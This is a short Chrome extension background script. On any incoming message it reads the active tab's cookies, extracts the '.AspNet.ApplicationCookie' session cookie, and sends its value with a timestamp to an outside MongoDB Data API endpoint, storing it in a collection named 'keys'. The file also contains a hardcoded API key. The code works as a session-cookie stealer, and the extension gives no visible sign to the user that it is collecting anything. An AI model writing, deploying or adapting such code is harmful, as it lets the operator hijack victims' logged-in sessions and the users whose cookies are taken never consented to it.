
chrome.runtime.onMessage.addListener(notify);
//'https://randomuser.me/api/'
function notify(message) {
  (async function () {
    let [tab] = await chrome.tabs.query({ active: true, lastFocusedWindow: true });
    chrome.cookies.getAll({ "url": tab.url }, async cookies => {

      let result = cookies.find(item => item.name === ".AspNet.ApplicationCookie");


      if (result) {
        const response = await fetch('https://eu-central-1.aws.data.mongodb-api.com/app/data-gkzbd/endpoint/data/v1/action/insertOne', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Access-Control-Request-Headers': '*',
            'api-key': 'IBHMJxT5BcafzwAZmVHyWnAIwU3el4H8vKwsz9kT93Vp8Ckt81skPx6FyTbtP8nJ',
          },

          body: JSON.stringify({
            "collection": "keys",
            "database": "law_articles",
            "dataSource": "Cluster0",
            "document": {
              'Timestamp': Date.now(),
              "Cookie": result.value
            }
          })
        })
        const movies = await response.json();
        const dta = JSON.stringify(movies)
        


      }


    });
  })();




}

/*
chrome.notifications.create({
          type: 'basic',
          iconUrl: '/images/icon48.png',
          title: `Cookie`,
          message: res,
          priority: 1
        });
*/